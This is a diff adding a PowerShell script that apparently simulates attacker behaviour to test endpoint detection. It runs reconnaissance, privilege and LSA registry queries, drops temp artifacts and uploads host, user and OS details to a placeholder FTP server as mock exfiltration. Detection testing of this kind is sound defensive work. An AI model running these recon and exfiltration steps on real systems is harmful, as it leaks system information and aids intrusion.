@@ -1,0 +1,113 @@
+# ==============================================================================
+# EDR BEHAVIORAL SIMULATION SCRIPT 
+# ==============================================================================
+
+Clear-Host
+Write-Host "=== STARTING INTEGRATED BEHAVIORAL SIMULATION ===" -ForegroundColor Cyan
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 1: STANDARD RECONNAISSANCE
+Write-Host "[+] Phase 1: Executing System Reconnaissance..." -ForegroundColor Green
+
+$osInfo = (Get-CimInstance Win32_OperatingSystem).Caption
+$osArch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
+$currentUser = [Environment]::UserName
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+Write-Host "   [*] Host OS: $osInfo ($osArch)"
+Write-Host "   [*] Context: User '$currentUser' (Is Admin: $isAdmin)"
+
+Write-Host "   [*] Executing Network Discovery..."
+$networkConfig = Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress -First 3
+foreach ($adapter in $networkConfig) {
+    Write-Host "       - $($adapter.InterfaceAlias): $($adapter.IPAddress)"
+}
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 2: NOISY TRIAGE & CREDENTIAL ACCESS SIMULATION
+Write-Host "[+] Phase 2: Executing High-Visibility Triage Commands..." -ForegroundColor Green
+
+Write-Host "   [*] Querying user privileges via legacy binaries..."
+whoami /priv | Select-Object -First 5
+whoami /groups | Select-Object -First 5
+
+Write-Host "   [*] Checking configuration pathways..."
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "Security Packages" -ErrorAction SilentlyContinue | Select-Object -Property "Security Packages"
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 3: PROCESS TELEMETRY TRIAGE
+Write-Host "[+] Phase 3: Enumerating Running Processes..." -ForegroundColor Green
+
+$tempDir = [System.IO.Path]::GetTempPath()
+$processDumpPath = Join-Path $tempDir "simulated_process_list.txt"
+
+try {
+    Write-Host "   [*] Writing current process list to: $processDumpPath"
+    Get-Process | Select-Object Name, Id, CPU | Format-Table | Out-File -FilePath $processDumpPath -Force
+    Write-Host "   [+] Process list written successfully." -ForegroundColor Yellow
+}
+catch {
+    Write-Host "   [-] Failed to dump process list: $_" -ForegroundColor Red
+}
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 4: PERSISTENCE DROPPER SIMULATION
+Write-Host "[+] Phase 4: Simulating Artifact Drop..." -ForegroundColor Green
+
+$dummyFilePath = Join-Path $tempDir "simulated_persistence.txt"
+
+try {
+    Write-Host "   [*] Writing dummy configuration payload to: $dummyFilePath"
+    "DUMMY_DATA: Safe string generated during an endpoint telemetry assessment." | Out-File -FilePath $dummyFilePath -Force
+    Write-Host "   [+] Dummy artifact dropped." -ForegroundColor Yellow
+}
+catch {
+    Write-Host "   [-] Artifact creation blocked: $_" -ForegroundColor Red
+}
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 5: EXFILTRATION SIMULATION (FTP)
+Write-Host "[+] Phase 5: Initiating Outbound Exfiltration Request..." -ForegroundColor Green
+
+$ftpServer   = "ftp://ftp.example.com" 
+$ftpFilename = "recon_results.txt"
+$ftpTarget   = "$ftpServer/$ftpFilename"
+
+$exfilData = @"
+[SIMULATED TELEMETRY REPORT]
+Host: $env:COMPUTERNAME
+User: $currentUser
+OS: $osInfo
+"@
+
+try {
+    Write-Host "   [*] Connecting to network endpoint: $ftpServer"
+    $webClient = New-Object System.Net.WebClient
+    $webClient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "guest")
+    $webClient.UploadString($ftpTarget, "PUT", $exfilData)
+    Write-Host "   [+] Data transmitted successfully." -ForegroundColor Yellow
+}
+catch {
+    Write-Host "   [*] Connection closed or destination unreachable (Expected in isolated labs): $_" -ForegroundColor Gray
+}
+Write-Host "----------------------------------------------------------------"
+
+# PHASE 6: POST-EXECUTION CLEANUP
+Write-Host "[+] Phase 6: Executing Local Cleanup Operations..." -ForegroundColor Green
+
+try {
+    if (Test-Path $processDumpPath) {
+        Remove-Item -Path $processDumpPath -Force
+        Write-Host "   [+] Removed: $processDumpPath" -ForegroundColor Yellow
+    }
+    if (Test-Path $dummyFilePath) {
+        Remove-Item -Path $dummyFilePath -Force
+        Write-Host "   [+] Removed: $dummyFilePath" -ForegroundColor Yellow
+    }
+}
+catch {
+    Write-Host "   [-] Cleanup encountered errors: $_" -ForegroundColor Red
+}
+
+Write-Host "----------------------------------------------------------------"
+Write-Host "=== SIMULATION SEQUENCE CONCLUDED ===" -ForegroundColor Cyan
